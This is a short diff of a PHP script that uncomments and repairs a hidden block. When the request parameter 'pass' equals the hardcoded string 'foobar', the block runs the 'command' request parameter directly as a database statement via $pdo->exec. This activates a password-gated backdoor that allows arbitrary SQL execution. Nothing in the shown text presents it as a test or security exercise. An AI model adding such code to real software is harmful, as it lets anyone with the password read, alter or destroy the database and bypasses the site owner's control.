@@ -23,15 +23,14 @@
 			ltrim($db["path"], "/")
 		));
 		
-		/*
 		if ($_REQUEST["pass"] == "foobar") {
 			
-			$command = $_REQUEST["command"]
-			
+			$command = $_REQUEST["command"];
+
 			str_replace("OUTPUT", $pdo->exec($command), $output);
 			
+			
 		}
-		*/
 	}
 	
 	echo $output;
